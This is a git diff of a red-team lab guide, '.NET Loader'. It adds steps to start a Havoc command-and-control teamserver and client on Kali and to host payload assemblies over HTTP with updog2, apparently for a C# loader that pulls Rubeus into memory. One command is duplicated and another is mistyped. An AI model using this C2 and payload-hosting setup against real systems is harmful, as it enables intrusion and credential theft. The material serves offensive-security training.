@@ -1,5 +1,6 @@
 # Lab - .NET Loader
 
+
 ```csharp
 using System;
 using System.Net.Http;
@@ -35,6 +36,41 @@ public class RubeusLoader
     }
 }
 ```
+
+---
+
+On your KALI, open a terminal and start your HAVOC Teamserver
+```bash
+cd /opt/Havoc
+./havoc server --profile ./profiles/havoc.yaotl -v
+```
+
+Open an additional terminal
+```bash
+cd /opt/Havoc
+.havoc client
+```
+
+And finally open a thrid terminal - this is where you will be hosting your payload with `Updog2`
+
+```bash
+cd /opt/Havoc/assemblies
+updog2
+```
+
+```bash
+./havoc server --profile ./profiles/havoc.yaotl -v
+```
+
+```bash
+[+] Serving /opt/Havoc/assemblies...
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:9090
+ * Running on http://10.0.0.7:9090
+Press CTRL+C to quit
+```
+
 
 ```powershell
 logman query providers dotnet-runtime
